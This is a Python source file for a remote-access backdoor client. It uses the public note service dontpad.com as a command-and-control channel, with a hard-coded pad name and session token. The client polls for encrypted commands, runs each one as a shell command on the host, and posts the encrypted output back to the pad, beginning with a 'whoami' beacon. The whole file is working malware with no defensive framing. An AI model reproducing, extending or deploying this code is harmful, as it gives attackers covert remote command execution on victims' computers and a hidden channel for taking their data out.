import requests
import time
import subprocess
from observer import Observer
import getpass
from criptographer import Criptographer

class Client:
    def __init__(self, url):
        self.url = url
        self.command = ''
        self.result = ''
        self.first_run = True
        self.username = getpass.getuser()
    
    def init_dontpad(self):
        data = {
            "text": Criptographer.encrypt('whoami', getpass.getuser()),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": "-25751fc88e6e559870fd"
        }
        requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}/request", data=data)

    def start(self, command_body):
        print("Comando recebido:\n", Criptographer.decrypt(command_body, self.username))
        if self.first_run:
            self.first_run = False
            self.init_dontpad()
            self.send_result_to_c2()
            
        self.execute_command(command_body)


    def execute_command(self, command_body):
        self.command = Criptographer.decrypt(command_body, self.username).strip()
        if self.command is None or self.command.lower() == "exit":
            return
        
        self.result = self.execute()
        self.send_result_to_c2()

    def execute(self):
        try:
            processo = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="ignore"
            )
            stdout, stderr = processo.communicate(timeout=20)
            if stderr:
                return f"Erro na execução do comando: {stderr}"
            return stdout.replace("�", "")
        except Exception as e:
            return f"Erro na execução do comando: {e}"

    def send_result_to_c2(self):
        data = {
            "text": Criptographer.encrypt(self.result, self.username),
            "lastModified": int(time.time() * 1000),
            "force": "true",
            "session-token": "-25751fc88e6e559870fd"
        }
        print(f'Sending result to C2: {data}')
        res = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{getpass.getuser()}/response", data=data)
        print(res.status_code, res.url)


if __name__ == "__main__":
    username = getpass.getuser()

    base_url = "https://api.dontpad.com"
    pad_name = "yaguinhofodinha"
    session_token = "-25751fc88e6e559870fd"

    url_with_username = (
        f"{base_url}/{pad_name}/{username}/request.body.json"
        f"?lastModified=0&session-token={session_token}"
    )

    first_url = (
        f"{base_url}/{pad_name}/request.body.json"
        f"?lastModified=0&session-token={session_token}"
    )

    client = Client(url=url_with_username)
    observer = Observer(first_url=first_url, url_with_username=url_with_username, client=client)
    observer.start()
